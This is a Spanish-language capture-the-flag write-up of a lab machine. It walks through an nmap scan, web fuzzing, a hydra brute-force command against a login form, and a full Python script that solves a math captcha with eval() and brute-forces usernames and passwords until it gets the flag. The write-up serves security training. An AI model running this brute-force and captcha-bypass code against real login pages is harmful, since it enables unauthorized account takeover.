Realizamos un escaneo de nmap y encontramos el puerto 80 abierto
![[Pasted image 20240808090918.png]]

Accedemos a la web y encontramos un panel de login
![[Pasted image 20240808090958.png]]

Realizamos una petición y la capturamos con burp suite
![[Pasted image 20240808091232.png]]

Hacemos fuzzing web y no encontramos mas que el panel ya visto anteriormente
![[Pasted image 20240808095533.png]]

Ahora realizaremos un ataque de fuerza bruta contra este panel con los diccionarios que nos proporciona esta maquina
![[Pasted image 20240808091321.png]]

Hacemos el ataque y nos muestra muchas opciones
```Bash
hydra -L usernames.txt -P passwords.txt 10.10.242.126 -s 80 http-post-form "/login:username=^USER^&password=^PASS^:The usr '^USER^'does not exist"
```
![[Pasted image 20240808093034.png]]

Si volvemos al panel de login y hacemos una prueba nos salta un captcha
![[Pasted image 20240808093056.png]]

Realizamos otra captura con burp suite para entender mejor como funciona este panel de login
![[Pasted image 20240808093218.png]]

Ahora utilizaremos el siguiente script para saltarnos el captcha y realizar un ataque de fuerza bruta
```Python
#! /usr/bin/python

from requests import Session
import re 

url = "http://10.10.242.126/login"

# Removing the line feed (\n) from the usernames and passwords read from the respective files
usernames = open('usernames.txt','r').read().splitlines()
passwords = open('passwords.txt', 'r').read().splitlines()


def solve_captcha(response):
 
  captcha_syntax = re.compile(r'(\s\s\d+\s[+*-/]\s\d+)\s\=\s\?')
  captcha = captcha_syntax.findall(response)
  return eval(' '.join(captcha))

#initializing a session
session = Session() 
data = {'username': 'username','password':'password'}
# create a post request to the url with the payload/data using the session opened
response = session.post(url,data=data) 

for user in usernames:

 response = session.post(url,data=data)
 data['username'] = user

 if 'Captcha enabled' in response.text:

  captcha_result = solve_captcha(response.text)

  data['captcha'] = captcha_result

 response = session.post(url,data =data)

 if 'does not exist' not in response.text:
  
  print(f'Found username: {user}')
  print(f"Attempting to brute forcing passowrd for user: {user}")

  for password in passwords:

   captcha_result = solve_captcha(response.text)
   data['password'] = password
   data['captcha'] = captcha_result

   response = session.post(url,data=data)

   if 'Error' not in response.text:

    print(f'----> Found Username: {user} Password: {password} ')
    exit()
   
   else:
    print(f'[*]Trying password: {password} for user ')
 
 else:
  print(f'[*] Trying password: password for user: {user}')
```

Si falla la ejecución del script es porque falta instalar la biblioteca de `requests`
```
pip3 install request
```
![[Pasted image 20240808095114.png]]

Ejecutamos el script y nos encuentra la password
![[Pasted image 20240808095051.png]]
![[Pasted image 20240808095030.png]]

Probamos las credenciales y obtenemos la flag
![[Pasted image 20240808095215.png]]


Si quisieramos saber cuantos intentos tenemos antes de que salte el captcha podriamos hacerlo realizando el ataque de fuerza bruta con burp suite, para ello lo preparamos desde intruder
![[Pasted image 20240808095927.png]]

Y ahora cargamos los diccionarios
![[Pasted image 20240808095834.png]]

Aproximadamente al intento numero 10 nos salta que se activa captcha
![[Pasted image 20240808100248.png]]